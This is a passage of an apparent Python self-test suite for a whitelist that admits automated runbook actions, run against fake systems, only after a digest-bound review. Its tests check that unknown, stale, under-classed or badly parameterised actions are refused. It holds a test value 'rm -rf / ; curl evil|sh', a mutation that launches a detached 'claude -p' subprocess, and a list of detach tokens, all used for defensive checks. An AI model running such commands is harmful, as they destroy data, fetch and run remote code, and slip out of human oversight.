"""the action whitelist (WARP-1205, W5 of PLAN-0012): runbook actions as code and the

ONE SUITE OF THE UNIT SUITE, AND A FRAGMENT RATHER THAN A MODULE. It is compiled and executed
into scripts/suites/shared.py's namespace by scripts/selftest.py, in manifest order, so every
suite sees exactly the state the monolith gave it and this decomposition cannot change what any
assertion proves. That is the whole reason for the design: the monolith carries cross-region
dependencies through MUTATED objects and through the filesystem, not only through names, and no
mechanical analysis finds those. Sharing one namespace in the original order means no membership
rule has to be closed and correctness is a property of the construction.

Run it: `python3 scripts/selftest.py --upto 09_action_whitelist_warp_1205` runs everything up to and including this
file, which is the inner loop for a change here. `python3 scripts/selftest.py` runs everything
and is the only thing that means green.

Regions 104-109 of the pre-split monolith.
"""


# --- the action whitelist (WARP-1205, W5 of PLAN-0012): runbook actions as code and the
# STORE that admits an action to the machine path ONLY after a recorded, digest-bound
# review. HIGH RISK (the whitelist is the enforcement core, C2): this is the execution-side
# pillar of Invention #3, and the refusals ARE the product (C1). veldo.action/v1 declares
# the fake system it acts against (NG1), typed parameter specs with validation constraints,
# a risk class, reversibility, a rollback plan, and canary support, plus a recorded review.
# THE LOAD-BEARING PROPERTIES, each proven non-vacuously with a positive control and a
# mutation that turns the check RED: anything NOT in the whitelist does not exist to the
# machine path (an unknown/unreviewed reference is unresolvable, never command text,
# C4/NG2); the store REJECTS an action with no recorded review, and a reviewed action edited
# afterward is refused as STALE (the digest binding); a class below the high floor (critical
# for data-mutating/irreversible) is refused (C2, nothing lowers a class); and an
# out-of-range/invalid parameter is refused BY NAME. veldo.action/v1 binds into veldo.remedy/v1
# (W1) via bind_remedy_action reusing the one parser. The reference trio ships as FAKE-system
# example actions (D3). This is the STORE and CONTRACT only: the executor (W6) and the
# two-key rule (W7) are honestly NOT built here, and this module runs NOTHING.
_actspec = importlib.util.spec_from_file_location("veldo_action", ROOT / ".veldo/action.py")
ACT = importlib.util.module_from_spec(_actspec); _actspec.loader.exec_module(ACT)

GOOD_ACTION = """schema: veldo.action/v1
id: scale_pool
title: Scale a worker pool to a target replica count
system: fake-pool-controller
risk_class: high
reversibility:
  class: reversible
  analysis: Scaling can be scaled back to the prior count and mutates no persistent data.
  data_mutating: false
parameters:
  - name: pool
    type: string
    required: true
    pattern: "^[a-z][a-z0-9-]{1,62}$"
  - name: replicas
    type: integer
    required: true
    min: 1
    max: 100
rollback: Scale the pool back to its prior replica count.
canary:
  supported: false
review:
  status: reviewed
  reviewer: illustrative fresh-context review (example only)
  verdict: approved
  reviewed_at: 2026-07-23T00:00:00Z
  reviewed_digest: sha256:0000000000000000
"""


def _act_errs(text):
    try:
        d = V.parse_yamlish(text)
    except ValueError:
        return 1
    return ACT.validate_action(d, ROOT, "selftest.action", V.fail)


# AC1 positive control: a well-formed veldo.action/v1 record validates structurally (the
# placeholder digest is irrelevant to validate_action, which checks structure, not currency).
expect("WARP-1205 AC1: a well-formed veldo.action/v1 record validates", _act_errs(GOOD_ACTION) == 0)

# AC1 structural closed vocabularies and required elements each REFUSE (fail closed).
expect("WARP-1205 AC1: action wrong schema refuses",
       _act_errs(GOOD_ACTION.replace("veldo.action/v1", "veldo.action/v9")) > 0)
expect("WARP-1205 AC1: action missing id refuses",
       _act_errs(GOOD_ACTION.replace("id: scale_pool\n", "")) > 0)
expect("WARP-1205 AC1: action missing system (the system it acts against) refuses",
       _act_errs(GOOD_ACTION.replace("system: fake-pool-controller\n", "")) > 0)
expect("WARP-1205 AC1: action out-of-vocabulary risk_class refuses",
       _act_errs(GOOD_ACTION.replace("risk_class: high", "risk_class: spicy")) > 0)
expect("WARP-1205 AC1: reversibility out-of-vocabulary class refuses",
       _act_errs(GOOD_ACTION.replace("class: reversible", "class: maybe")) > 0)
expect("WARP-1205 AC1: reversibility missing analysis refuses",
       _act_errs(GOOD_ACTION.replace("  analysis: Scaling can be scaled back to the prior count and mutates no persistent data.\n", "")) > 0)
expect("WARP-1205 AC1: reversibility missing data_mutating refuses",
       _act_errs(GOOD_ACTION.replace("  data_mutating: false\n", "")) > 0)
expect("WARP-1205 AC1 (element e): a malformed action (outside the parser subset) fails closed",
       _act_errs("schema: veldo.action/v1\n\tid: tabbed\n") > 0)

# AC1 the safety omissions fail closed: no rollback, no canary declaration.
expect("WARP-1205 AC1: an action that omits its rollback plan is REFUSED (safety omission)",
       _act_errs(GOOD_ACTION.replace("rollback: Scale the pool back to its prior replica count.\n", "")) > 0)
expect("WARP-1205 AC1: an action that omits its canary declaration is REFUSED",
       _act_errs(GOOD_ACTION.replace("canary:\n  supported: false\n", "")) > 0)
expect("WARP-1205 AC1: a canary declared supported with no shape refuses",
       _act_errs(GOOD_ACTION.replace("canary:\n  supported: false\n", "canary:\n  supported: true\n")) > 0)

# AC1 parameter-spec structural refusals: a spec with no name, a bad type, an enum with no
# values, an inverted numeric range, an uncompilable pattern, and a duplicate parameter name.
expect("WARP-1205 AC1: a parameter spec with no name refuses",
       _act_errs(GOOD_ACTION.replace("  - name: pool\n", "  - label: pool\n")) > 0)
expect("WARP-1205 AC1: a parameter spec with an out-of-vocabulary type refuses",
       _act_errs(GOOD_ACTION.replace("    type: integer\n", "    type: quantum\n")) > 0)
expect("WARP-1205 AC1: an enum parameter with no values refuses",
       _act_errs(GOOD_ACTION.replace("    type: integer\n    required: true\n    min: 1\n    max: 100\n", "    type: enum\n    required: true\n")) > 0)
expect("WARP-1205 AC1: an integer parameter with an inverted min/max range refuses",
       _act_errs(GOOD_ACTION.replace("    min: 1\n    max: 100\n", "    min: 100\n    max: 1\n")) > 0)
expect("WARP-1205 AC1: a parameter with an uncompilable pattern refuses",
       _act_errs(GOOD_ACTION.replace('    pattern: "^[a-z][a-z0-9-]{1,62}$"\n', '    pattern: "(unclosed"\n')) > 0)
expect("WARP-1205 AC1: a duplicate parameter name refuses",
       _act_errs(GOOD_ACTION.replace("  - name: replicas\n    type: integer\n    required: true\n    min: 1\n    max: 100\n",
                                     "  - name: pool\n    type: string\n    required: true\n")) > 0)

# AC1 the recorded-review block structural rules fail closed.
expect("WARP-1205 AC1: an action with NO review block is REFUSED at contract time (every action carries a recorded review)",
       _act_errs(GOOD_ACTION.replace("review:\n  status: reviewed\n  reviewer: illustrative fresh-context review (example only)\n  verdict: approved\n  reviewed_at: 2026-07-23T00:00:00Z\n  reviewed_digest: sha256:0000000000000000\n", "")) > 0)
expect("WARP-1205 AC1: a review out-of-vocabulary status refuses",
       _act_errs(GOOD_ACTION.replace("  status: reviewed\n", "  status: perhaps\n")) > 0)
expect("WARP-1205 AC1: a reviewed action missing its reviewer refuses",
       _act_errs(GOOD_ACTION.replace("  reviewer: illustrative fresh-context review (example only)\n", "")) > 0)
expect("WARP-1205 AC1: a reviewed action missing its reviewed_digest refuses (a review binds to what it vetted)",
       _act_errs(GOOD_ACTION.replace("  reviewed_digest: sha256:0000000000000000\n", "")) > 0)
expect("WARP-1205 AC1: a reviewed action whose verdict is REJECTED is a contradiction and refuses (a rejected review does not vet the action)",
       _act_errs(GOOD_ACTION.replace("  verdict: approved\n", "  verdict: rejected\n")) > 0)

# AC2 THE RISK FLOOR (C2): nothing lowers a class. The whitelist floor is high; a
# data-mutating or irreversible action carries critical. Positive controls make it non-vacuous.
expect("WARP-1205 AC2: a data-mutating action declaring risk high is REFUSED (its floor is critical, C2)",
       _act_errs(GOOD_ACTION.replace("  data_mutating: false\n", "  data_mutating: true\n")) > 0)
expect("WARP-1205 AC2: an irreversible action declaring risk high is REFUSED (its floor is critical, C2)",
       _act_errs(GOOD_ACTION.replace("class: reversible", "class: irreversible")) > 0)
expect("WARP-1205 AC2: an action declaring risk standard is REFUSED (below the high whitelist floor, nothing lowers a class)",
       _act_errs(GOOD_ACTION.replace("risk_class: high", "risk_class: standard")) > 0)
expect("WARP-1205 AC2: a data-mutating action declaring risk CRITICAL validates (positive control: a raise is allowed)",
       _act_errs(GOOD_ACTION.replace("  data_mutating: false\n", "  data_mutating: true\n").replace("risk_class: high", "risk_class: critical")) == 0)
expect("WARP-1205 AC2: a high-floor action declaring risk CRITICAL validates (positive control: raising is always allowed)",
       _act_errs(GOOD_ACTION.replace("risk_class: high", "risk_class: critical")) == 0)
expect("WARP-1205 AC2: risk_floor is high for a reversible non-data-mutating action and critical for a data-mutating one",
       ACT.risk_floor(V.parse_yamlish(GOOD_ACTION)) == "high"
       and ACT.risk_floor(V.parse_yamlish(GOOD_ACTION.replace("  data_mutating: false\n", "  data_mutating: true\n"))) == "critical")

# AC3 THE DIGEST-BOUND REVIEW: action_reviewed admits only a reviewed, approved, digest-current
# action; review_stale detects an action edited after review. Deterministic and non-vacuous.
_ga = V.parse_yamlish(GOOD_ACTION)
_ga_dig = ACT.action_digest(_ga)
expect("WARP-1205 AC3: action_digest is deterministic and excludes the review block (re-hashing the same content matches)",
       ACT.action_digest(_ga) == _ga_dig and ACT.action_digest(V.parse_yamlish(GOOD_ACTION)) == _ga_dig)
_ga_reviewed = V.parse_yamlish(GOOD_ACTION.replace("sha256:0000000000000000", _ga_dig))
expect("WARP-1205 AC3: an action whose reviewed_digest matches its content is ADMITTED (action_reviewed True, positive control)",
       ACT.action_reviewed(_ga_reviewed) is True and ACT.review_stale(_ga_reviewed) is False)
expect("WARP-1205 AC3: the placeholder-digest action is NOT admitted (its recorded digest does not match its content)",
       ACT.action_reviewed(_ga) is False)
_ga_stale = V.parse_yamlish(GOOD_ACTION.replace("sha256:0000000000000000", _ga_dig).replace("    max: 100\n", "    max: 200\n"))
expect("WARP-1205 AC3 TEETH: editing a reviewed action's content (max 100 -> 200) makes the review STALE and it is NOT admitted",
       ACT.review_stale(_ga_stale) is True and ACT.action_reviewed(_ga_stale) is False)
expect("WARP-1205 AC3: a PROPOSED (unreviewed) action is not stale but is NOT admitted (it does not exist to the machine path)",
       ACT.review_stale(V.parse_yamlish(GOOD_ACTION.replace("  status: reviewed\n", "  status: proposed\n"))) is False
       and ACT.action_reviewed(V.parse_yamlish(GOOD_ACTION.replace("  status: reviewed\n", "  status: proposed\n"))) is False)

# AC1/AC3 the shipped reference-trio examples validate AND are admitted (reviewed, digest-current).
_ACT_TRIO = ["action-rollback-deploy-example.yaml", "action-restart-service-example.yaml", "action-scale-pool-example.yaml"]
for _af in _ACT_TRIO:
    _ap = ROOT / ".veldo/examples" / _af
    expect("WARP-1205 AC1: the shipped action example %s validates" % _af,
           ACT.check_action(_ap, ROOT, False, V.parse_yamlish, V.fail) == 0)
    expect("WARP-1205 AC3: the shipped action example %s is reviewed and digest-current (drift guard)" % _af,
           ACT.action_reviewed(V.parse_yamlish(_ap.read_text())) is True)
expect("WARP-1205 AC1: the shipped examples are clearly illustrative fake-system actions (D3 reference trio)",
       "fake-deploy-controller" in (ROOT / ".veldo/examples/action-rollback-deploy-example.yaml").read_text()
       and "fake-service-controller" in (ROOT / ".veldo/examples/action-restart-service-example.yaml").read_text()
       and "fake-pool-controller" in (ROOT / ".veldo/examples/action-scale-pool-example.yaml").read_text())

# AC4 THE WHITELIST STORE, resolution, and the C4/NG2 property, over a temp .veldo/actions/ tree
# holding the reference trio. Anything not in the whitelist does not exist to the machine path.
with tempfile.TemporaryDirectory() as _actd:
    _adir = Path(_actd) / ".veldo" / "actions"
    _adir.mkdir(parents=True)
    for _af in _ACT_TRIO:
        (_adir / _af).write_text((ROOT / ".veldo/examples" / _af).read_text())
    expect("WARP-1205 AC4: check_actions over the trio passes (all three valid, reviewed, digest-current)",
           ACT.check_actions(_adir, Path(_actd), V.parse_yamlish, V.fail) == 0)
    _wl, _wle = ACT.build_whitelist(_adir, V.parse_yamlish, V.fail)
    expect("WARP-1205 AC4: build_whitelist admits EXACTLY the reviewed trio (restart_service, rollback_deploy, scale_pool)",
           _wle == 0 and sorted(_wl) == ["restart_service", "rollback_deploy", "scale_pool"])
    expect("WARP-1205 AC4: resolve_action resolves a whitelisted reference (rollback_deploy) and returns None for an unknown one",
           ACT.resolve_action("rollback_deploy", _wl) is not None and ACT.resolve_action("delete_database", _wl) is None)
    expect("WARP-1205 AC4 TEETH: require_action REFUSES an unknown reference by name (it does not exist to the machine path, C4/NG2)",
           ACT.require_action("delete_database", _wl, V.fail, "sel")[1] > 0)
    expect("WARP-1205 AC4 TEETH: an action reference is NEVER interpreted as command text (a shell-looking reference is unresolvable)",
           ACT.resolve_action("rm -rf / ; curl evil|sh", _wl) is None
           and ACT.require_action("rm -rf / ; curl evil|sh", _wl, V.fail, "sel")[1] > 0)
    expect("WARP-1205 AC4: a non-string reference is unresolvable (fail closed)",
           ACT.resolve_action(None, _wl) is None and ACT.resolve_action(["rollback_deploy"], _wl) is None)

    # AC4 veldo.action/v1 BINDS INTO veldo.remedy/v1 (W1): the shipped remedy example proposes
    # rollback_deploy by reference and binds clean; an unknown action or a bad parameter refuses.
    _rem_ex = V.parse_yamlish((ROOT / ".veldo/examples/remedy-example.yaml").read_text())
    expect("WARP-1205 AC4: the shipped remedy example binds to the whitelist (rollback_deploy resolves and its parameters validate) - no second parser",
           ACT.bind_remedy_action(_rem_ex, _wl, V.fail, "remedy-ex") == 0)
    _rem_unknown = dict(_rem_ex, proposed_action={"action": "wipe_everything", "parameters": {}})
    expect("WARP-1205 AC4 TEETH: a remedy naming an action NOT in the whitelist is REFUSED (does not exist to the machine path)",
           ACT.bind_remedy_action(_rem_unknown, _wl, V.fail, "remedy-unknown") > 0)
    _rem_badparam = dict(_rem_ex, proposed_action={"action": "rollback_deploy",
                         "parameters": {"service": "payment-confirmation", "to_release": "Prior Known Good!"}})
    expect("WARP-1205 AC4 TEETH: a remedy with an out-of-pattern parameter is REFUSED by name at bind time",
           ACT.bind_remedy_action(_rem_badparam, _wl, V.fail, "remedy-badparam") > 0)

    # AC4 PARAMETER VALIDATION over the resolved trio, refused BY NAME (element c).
    _sp, _rs, _rd = _wl["scale_pool"], _wl["restart_service"], _wl["rollback_deploy"]
    expect("WARP-1205 AC4: valid parameters pass (positive control: pool + replicas 8)",
           ACT.validate_parameters(_sp, {"pool": "workers", "replicas": 8}, V.fail, "sel") == 0)
    expect("WARP-1205 AC4 TEETH: an integer parameter ABOVE its declared maximum is refused by name",
           ACT.validate_parameters(_sp, {"pool": "workers", "replicas": 200}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4 TEETH: an integer parameter BELOW its declared minimum is refused by name",
           ACT.validate_parameters(_sp, {"pool": "workers", "replicas": 0}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4 TEETH: a wrong-type parameter (string where integer declared) is refused by name",
           ACT.validate_parameters(_sp, {"pool": "workers", "replicas": "five"}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4 TEETH: an unknown parameter (not declared by the action) is refused by name",
           ACT.validate_parameters(_sp, {"pool": "workers", "replicas": 8, "nodes": 3}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4 TEETH: a missing REQUIRED parameter is refused by name",
           ACT.validate_parameters(_sp, {"replicas": 8}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4 TEETH: an enum parameter value outside its declared set is refused by name",
           ACT.validate_parameters(_rs, {"service": "api", "strategy": "nuke"}, V.fail, "sel") > 0)
    expect("WARP-1205 AC4: a valid enum value passes (positive control)",
           ACT.validate_parameters(_rs, {"service": "api", "strategy": "rolling"}, V.fail, "sel") == 0)
    expect("WARP-1205 AC4 TEETH: a string parameter that fails its declared pattern is refused by name",
           ACT.validate_parameters(_rd, {"service": "API-Svc", "to_release": "v1"}, V.fail, "sel") > 0)

# AC4 adoption-safe and fail-closed at the DIRECTORY and FILE boundary.
with tempfile.TemporaryDirectory() as _actd2:
    _acp = Path(_actd2)
    _adir2 = _acp / ".veldo" / "actions"
    expect("WARP-1205 AC4: an absent .veldo/actions/ directory stands down (adoption safe)",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) == 0
           and ACT.build_whitelist(_adir2, V.parse_yamlish, V.fail) == ({}, 0))
    expect("WARP-1205 AC4: a required-but-absent single action fails closed by name",
           ACT.check_action(_acp / "nope.yaml", _acp, True, V.parse_yamlish, V.fail) > 0)
    _adir2.mkdir(parents=True)
    (_adir2 / "scale.yaml").write_text(GOOD_ACTION.replace("sha256:0000000000000000", _ga_dig))
    expect("WARP-1205 AC4: a present valid reviewed action validates through the scan and is admitted",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) == 0
           and sorted(ACT.build_whitelist(_adir2, V.parse_yamlish, V.fail)[0]) == ["scale_pool"])
    # A PROPOSED (draft) action: a valid record that passes the scan but is NOT admitted.
    (_adir2 / "proposed.yaml").write_text(
        GOOD_ACTION.replace("id: scale_pool", "id: drain_node")
                   .replace("  status: reviewed\n  reviewer: illustrative fresh-context review (example only)\n  verdict: approved\n  reviewed_at: 2026-07-23T00:00:00Z\n  reviewed_digest: sha256:0000000000000000\n",
                            "  status: proposed\n"))
    expect("WARP-1205 AC4: a PROPOSED action is a valid draft (check_actions passes) but is NOT admitted to the whitelist",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) == 0
           and "drain_node" not in ACT.build_whitelist(_adir2, V.parse_yamlish, V.fail)[0])
    (_adir2 / "proposed.yaml").unlink()
    # A STALE reviewed action (edited after review): fails closed.
    (_adir2 / "stale.yaml").write_text(
        GOOD_ACTION.replace("id: scale_pool", "id: burst_pool").replace("sha256:0000000000000000", _ga_dig).replace("    max: 100\n", "    max: 500\n"))
    expect("WARP-1205 AC4 TEETH: a reviewed action edited after review (stale digest) FAILS CLOSED in the scan and is not admitted",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) > 0
           and "burst_pool" not in ACT.build_whitelist(_adir2, V.parse_yamlish, V.fail)[0])
    (_adir2 / "stale.yaml").unlink()
    # A malformed present action fails closed.
    (_adir2 / "tab.yaml").write_text("schema: veldo.action/v1\n\tid: tabbed\n")
    expect("WARP-1205 AC4: a malformed present action fails closed",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) > 0)
    (_adir2 / "tab.yaml").unlink()
    # A duplicate action id fails closed.
    (_adir2 / "dup.yaml").write_text(GOOD_ACTION.replace("sha256:0000000000000000", _ga_dig))  # same id scale_pool
    expect("WARP-1205 AC4: a duplicate action id across records is refused",
           ACT.check_actions(_adir2, _acp, V.parse_yamlish, V.fail) > 0)

# AC5 MUTATION teeth over the REAL shipped example (anti-vacuity C1): each safety guard turns
# the check RED, and every mutation reverts byte-identical (the on-disk file is unchanged).
_act_ex = ROOT / ".veldo/examples/action-scale-pool-example.yaml"
_act_real = _act_ex.read_text()
_act_mut_noreview = _act_real.replace("review:\n  status: reviewed\n  reviewer: illustrative fresh-context review (example only; a real action is vetted through the normal VELDO loop and promoted by a human)\n  verdict: approved\n  reviewed_at: 2026-07-23T00:00:00Z\n  reviewed_digest: sha256:0d61164a1a3598bf\n", "", 1)
expect("WARP-1205 TEETH: stripping the real action's review block turns the check RED",
       _act_mut_noreview != _act_real and _act_errs(_act_mut_noreview) > 0)
_act_mut_lowrisk = _act_real.replace("risk_class: high", "risk_class: standard", 1)
expect("WARP-1205 TEETH: declaring the real action's risk below the floor (high -> standard) turns the check RED (C2)",
       _act_mut_lowrisk != _act_real and _act_errs(_act_mut_lowrisk) > 0)
_act_mut_dm = _act_real.replace("  data_mutating: false\n", "  data_mutating: true\n", 1)
expect("WARP-1205 TEETH: making the real action data-mutating while it declares risk high turns the check RED (floor critical, C2)",
       _act_mut_dm != _act_real and _act_errs(_act_mut_dm) > 0)
_act_mut_norb = _act_real.replace("\nrollback:", "\nxrollback:", 1)
expect("WARP-1205 TEETH: stripping the real action's rollback plan turns the check RED",
       _act_mut_norb != _act_real and _act_errs(_act_mut_norb) > 0)
_act_mut_edit = _act_real.replace("    max: 100\n", "    max: 250\n", 1)
expect("WARP-1205 TEETH: editing the real reviewed action (max 100 -> 250) turns the STALE-review check RED (digest binding)",
       _act_mut_edit != _act_real and ACT.review_stale(V.parse_yamlish(_act_mut_edit)) is True)
expect("WARP-1205 TEETH: all mutations were in-memory only (the real example on disk is byte-unchanged)",
       _act_ex.read_text() == _act_real)

# AC5 IN-SESSION only, no detached process (NG3, no-detach), mirroring the sibling organs.
_act_src = (ROOT / ".veldo/action.py").read_text()
expect("WARP-1205 AC5: action.py starts no detached/background process (no subprocess/Popen/threading/multiprocessing/asyncio/setsid/nohup/claude -p)",
       not any(t in _act_src for t in _TRIP_DETACH_TOKENS))
expect("WARP-1205 AC5: action.py imports no process/thread machinery at module scope (pathlib/json/hashlib/re only)",
       "import subprocess" not in _act_src and "import threading" not in _act_src
       and "import multiprocessing" not in _act_src and "import asyncio" not in _act_src)
_act_mut_popen = _act_src + '\nimport subprocess as _s\n_p = _s.Popen(["claude", "-p", "x"], start_new_session=True)\n'
expect("WARP-1205 AC5 TEETH: a detached subprocess.Popen(claude -p) mutation turns the no-detach check RED",
       any(t in _act_mut_popen for t in _TRIP_DETACH_TOKENS))
expect("WARP-1205 AC5: the no-detach mutation is in-memory only (the real module on disk is byte-unchanged)",
       (ROOT / ".veldo/action.py").read_text() == _act_src)

# AC5 byte-identical engine sync across root, engine, and all 6 packs.
for _acf in ("action.py", "capabilities.yaml"):
    expect("WARP-1205 AC5: .veldo/%s is byte-identical root vs engine" % _acf,
           (ROOT / (".veldo/" + _acf)).read_bytes() == (ROOT / ("engine/.veldo/" + _acf)).read_bytes())
    expect("WARP-1205 AC5: .veldo/%s is byte-identical across all 6 packs" % _acf,
           (ROOT / (".veldo/" + _acf)).read_bytes() == (ROOT / ("engine/.veldo/" + _acf)).read_bytes())
expect("WARP-1205 AC5: the three action examples are byte-identical root vs engine (init lay-down; packs carry no examples)",
       all((ROOT / ".veldo/examples" / _af).read_bytes() == (ROOT / "engine/.veldo/examples" / _af).read_bytes() for _af in _ACT_TRIO))
expect("WARP-1205 AC5: the action_whitelist capability is declared mechanical with home .veldo/action.py",
       bool(re.search(r"(?m)^\s{2}action_whitelist:\s*\{status:\s*mechanical,\s*home:\s*\.veldo/action\.py\b", (ROOT / ".veldo/capabilities.yaml").read_text())))

# AC5 dogfood: this spec's placement resolves to contracts and its footprint tier is standard,
# but it is HIGH RISK and ships at human_approval REQUIRED (C2, the safety-core floor) - the
# landing key is a separate recorded human act, not the builder's.
_p1205_fm = V.parse_yamlish(re.match(r"^---\n(.*?)\n---", (ROOT / "specs/WARP-1205-the-action-whitelist.md").read_text(), re.S).group(1))
_p1205_arch, _p1205_contract = V.load_repo_contract(repo_root=str(ROOT))
expect("WARP-1205 AC5 dogfood: the spec placement resolves and passes the mandatory placement gate (tier standard, no boundary crossing)",
       _p1205_contract is not None and _p1205_arch.placement_gate(_p1205_fm, _p1205_contract) == []
       and _p1205_arch.footprint_tier_floor(_p1205_fm, _p1205_contract) == "")
expect("WARP-1205 AC5: HIGH RISK and human_approval REQUIRED (C2, the enforcement core), and no protected path is touched (action.py is a placeless contracts-lane engine module)",
       _p1205_arch._risk_word(_p1205_fm.get("risk")) == "high" and _p1205_fm.get("human_approval") == "required"
       and (_p1205_fm.get("protected_paths") or []) == [])

# --- the execution organ (WARP-1206, W6 of PLAN-0012): the separate, privileged, laddered
# executor that runs ONLY whitelisted actions with validated parameters bound to a proposal
# digest, on its OWN credential and code path, behind the standing safeguards. HIGH RISK (the
# enforcement core on the execution side, C2); it is the single most safety-critical organ, and
# the refusals ARE the product (C1). This is NOT .veldo/executor.py (that is the VELDO build-loop
# executor, WARP-0401); it is a distinct organ, .veldo/action_executor.py.
# THE LOAD-BEARING PROPERTIES, each proven non-vacuously with a positive control: separation is
# structural (its OWN credential type, no query/read method, shares nothing with the responder,
# C4); it accepts a whitelist action reference + validated parameters BOUND TO A PROPOSAL DIGEST,
# never command text, resolving through W5's store (reused, no second resolver); the autonomy
# ladder floor L0/L1 NEVER executes, L2 executes only strictly reversible non-data-mutating
# actions after a human confirmation bound to the digest, and L3 is disabled by default and
# lowest-class-only if ever enabled (D2); anything irreversible or data-mutating REFUSES pending
# the two-key rule (W7), so W6 builds no data-mutating path (HIGH, not critical); and the standing
# safeguards (kill switch, budget, timeout, canary-first) each refuse by name. Fail closed,
# degrade down, no self-escalation (NG4), no detached process (NG3), offline against fakes (NG1).
_aespec = importlib.util.spec_from_file_location("veldo_action_executor", ROOT / ".veldo/action_executor.py")
AE = importlib.util.module_from_spec(_aespec); _aespec.loader.exec_module(AE)
_ev1206spec = importlib.util.spec_from_file_location("veldo_evidence_1206", ROOT / ".veldo/evidence.py")
EV1206 = importlib.util.module_from_spec(_ev1206spec); _ev1206spec.loader.exec_module(EV1206)
_resp1206spec = importlib.util.spec_from_file_location("veldo_responder_1206", ROOT / ".veldo/responder.py")
RESP1206 = importlib.util.module_from_spec(_resp1206spec); _resp1206spec.loader.exec_module(RESP1206)

# Build the effective whitelist from the shipped reference trio (D3), in a fresh actions view.
_ae_wl = {}
with tempfile.TemporaryDirectory() as _aed:
    _aeadir = Path(_aed) / ".veldo" / "actions"
    _aeadir.mkdir(parents=True)
    for _af in _ACT_TRIO:
        (_aeadir / _af).write_text((ROOT / ".veldo/examples" / _af).read_text())
    _ae_wl, _ae_wle = ACT.build_whitelist(_aeadir, V.parse_yamlish, V.fail)
expect("WARP-1206 setup: the reference-trio whitelist admits rollback_deploy, restart_service, scale_pool",
       _ae_wle == 0 and sorted(_ae_wl) == ["restart_service", "rollback_deploy", "scale_pool"])

_ae_remedy = V.parse_yamlish(GOOD_REMEDY)  # rollback_deploy, L2, reversible, human_confirmation, canary


def _ae_cred(actor="dmitry-executor", system="fake-deploy-controller"):
    return AE.ExecutorCredential(actor, system, object())


def _ae_ladder(level="L2", system="fake-deploy-controller", l3_enabled=False):
    return AE.AutonomyLadder(levels={system: level}, l3_enabled=l3_enabled)


def _ae_exec(level="L2", kill=None, budget=None, timeout=300, fake=None,
             system="fake-deploy-controller", l3_enabled=False):
    return AE.ActionExecutor(
        _ae_cred(system=system), _ae_ladder(level, system, l3_enabled),
        kill if kill is not None else AE.KillSwitch(),
        budget if budget is not None else AE.ActionBudget(5),
        fake if fake is not None else AE.FakeActionSystem(),
        ACT, INC, timeout_seconds=timeout)


def _ae_conf(remedy=None, **over):
    r = remedy if remedy is not None else _ae_remedy
    c = {"decision": "confirmed", "confirmed_by": "dmitry",
         "proposal_digest": AE.proposal_digest(r), "incident": r.get("incident")}
    c.update(over)
    return c


# POSITIVE CONTROL: an L2, reversible, non-data-mutating whitelisted action with a human
# confirmation bound to the proposal digest EXECUTES against the fake system, canary-FIRST.
_ae_fake = AE.FakeActionSystem()
_ae_ok = _ae_exec(fake=_ae_fake).execute(_ae_remedy, _ae_wl, _ae_conf())
expect("WARP-1206 AC-positive: an L2 reversible whitelisted action with a bound human confirmation EXECUTES",
       _ae_ok.get("executed") is True and _ae_ok.get("refused") is None and _ae_ok.get("action") == "rollback_deploy")
expect("WARP-1206 RJ3: CANARY-FIRST - the canary runs BEFORE the main action (sequence [canary, action])",
       _ae_ok.get("sequence") == ["canary", "action"] and [o["op"] for o in _ae_fake.ops] == ["canary", "action"])
expect("WARP-1206 AC-positive: the executed result carries the proposal digest it was bound to and names no secret",
       _ae_ok.get("proposal_digest") == AE.proposal_digest(_ae_remedy) and "secret" not in _ae_ok)

# RJ3 REFUSAL 1: a non-whitelisted action does not exist to the machine path (C4/NG2), never command text.
_ae_unknown = dict(_ae_remedy, proposed_action={"action": "wipe_everything", "parameters": {}})
expect("WARP-1206 RJ3: a NON-WHITELISTED action REFUSES (does not exist to the machine path, C4/NG2)",
       _ae_exec().execute(_ae_unknown, _ae_wl, _ae_conf(_ae_unknown)).get("refused") == AE.REFUSE_ACTION_NOT_WHITELISTED)
_ae_shell = dict(_ae_remedy, proposed_action={"action": "rm -rf / ; curl evil|sh", "parameters": {}})
expect("WARP-1206 RJ3: a shell-looking action reference is unresolvable, never interpreted as command text",
       _ae_exec().execute(_ae_shell, _ae_wl, _ae_conf(_ae_shell)).get("refused") == AE.REFUSE_ACTION_NOT_WHITELISTED)
expect("WARP-1206 C4: an empty/absent whitelist means nothing exists to the machine path (fail closed)",
       _ae_exec().execute(_ae_remedy, {}, _ae_conf()).get("refused") == AE.REFUSE_ACTION_NOT_WHITELISTED)

# RJ3 REFUSAL 2: an invalid parameter is refused BY NAME (reusing W5 validate_parameters).
_ae_badparam = dict(_ae_remedy, proposed_action={"action": "rollback_deploy",
                    "parameters": {"service": "payment-confirmation", "to_release": "Prior Known Good!"}})
expect("WARP-1206 RJ3: an INVALID PARAMETER (out-of-pattern) REFUSES by name (W5 validate_parameters reused)",
       _ae_exec().execute(_ae_badparam, _ae_wl, _ae_conf(_ae_badparam)).get("refused") == AE.REFUSE_INVALID_PARAMETERS)
_ae_badparam2 = dict(_ae_remedy, proposed_action={"action": "scale_pool", "parameters": {"pool": "workers", "replicas": 9000}})
expect("WARP-1206 RJ3: an out-of-range integer parameter REFUSES by name",
       _ae_exec(system="fake-pool-controller").execute(_ae_badparam2, _ae_wl, _ae_conf(_ae_badparam2)).get("refused") == AE.REFUSE_INVALID_PARAMETERS)

# RJ3 REFUSAL 3: the read-only floor (L0, L1) NEVER executes. Positive control: L2 executes (above).
for _lvl in ("L0", "L1"):
    expect("WARP-1206 RJ3: the read-only floor %s NEVER executes (below_execution_floor, O3/D2)" % _lvl,
           _ae_exec(level=_lvl).execute(_ae_remedy, _ae_wl, _ae_conf()).get("refused") == AE.REFUSE_BELOW_FLOOR)
expect("WARP-1206 O3: an UNCONFIGURED system defaults to the floor L0 and does not execute (fail closed)",
       AE.ActionExecutor(_ae_cred(system="unknown-sys"), AE.AutonomyLadder(), AE.KillSwitch(), AE.ActionBudget(5),
                         AE.FakeActionSystem(), ACT, INC, timeout_seconds=300
